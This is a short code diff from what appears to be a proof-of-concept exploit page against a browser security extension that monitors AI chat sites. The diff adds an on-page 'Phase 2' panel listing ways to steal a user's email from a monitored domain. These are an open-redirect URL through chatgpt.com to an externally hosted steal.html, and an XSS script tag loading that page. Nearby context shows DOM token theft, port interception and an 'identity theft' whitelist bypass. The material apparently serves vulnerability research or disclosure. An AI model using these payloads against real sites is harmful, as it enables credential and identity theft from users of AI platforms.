@@ -387,6 +387,29 @@ function display() {
     row("Bypass Path A — Token from DOM (#ps_script.dataset.handshake_token)", R.domToken || "N/A (port intercepted instead)");
     row("Bypass Path B — Port Intercepted", R.portStatus);
 
+    // If port not available, show Phase 2 attack path
+    if (!_port) {
+        const d = document.createElement("div");
+        d.className = "result-item";
+        d.style.border = "1px solid #f59e0b";
+        d.innerHTML = `<span class="label" style="color:#f59e0b">&#x26a0;&#xfe0f; Phase 2 Required for Email:</span>
+<pre style="color:#aaa">Port not established — this page is not a monitored AI domain.
+Email exfil requires visiting steal.html FROM a monitored domain
+(chatgpt.com, claude.ai, gemini.google.com, etc.) where
+script.bundle.js is injected and the port handshake fires.
+
+<b style="color:#f59e0b">Attack Options:</b>
+1. Open Redirect (if available on AI platform):
+   https://chatgpt.com/auth/login?next=https%3A%2F%2Fnishantshekhar2.github.io%2Fprompt-security-extension-poc%2Fsteal.html
+
+2. XSS payload on monitored domain:
+   &lt;script src="https://nishantshekhar2.github.io/prompt-security-extension-poc/steal.html"&gt;&lt;/script&gt;
+
+3. Direct test — navigate to this URL while on chatgpt.com:
+   <a href="steal.html" target="_blank" style="color:#7c3aed">steal.html</a> (open from chatgpt.com tab)</pre>`;
+        el.appendChild(d);
+    }
+
     // Identity (Bypass A via getSiteActionConfig)
     hdr("IDENTITY THEFT — BYPASS A: Whitelist Confusion (type vs message field)");
     row("Bypass technique",
